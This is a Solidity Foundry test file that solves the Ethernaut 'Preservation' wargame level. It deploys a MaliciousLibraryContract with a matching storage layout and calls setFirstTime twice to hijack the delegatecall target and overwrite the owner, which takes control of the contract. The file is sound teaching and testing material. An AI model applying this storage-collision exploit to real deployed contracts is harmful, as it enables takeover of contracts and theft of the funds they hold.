pragma solidity 0.8.11;

import "src/levels/Preservation/Preservation.sol";
import "src/levels/Preservation/PreservationFactory.sol";
import "forge-std/Test.sol";
import "src/openzeppelin-contracts-08/token/ERC20/ERC20.sol";

import {console} from "forge-std/console.sol";

contract PreservationAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    PreservationFactory public factory;
    Preservation public instance;

    function setUp() public {
        factory = new PreservationFactory();
        instance = Preservation(factory.createInstance(dummyPlayerAddress));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress, dummyPlayerAddress);

        MaliciousLibraryContract maliciousLibrary = new MaliciousLibraryContract();
        instance.setFirstTime(uint256(uint160(address(maliciousLibrary))));
        instance.setFirstTime(uint256(uint160(dummyPlayerAddress)));
        
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
    }
}


contract MaliciousLibraryContract {
   // public library contracts
    address public _gap0;
    address public _gap1;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}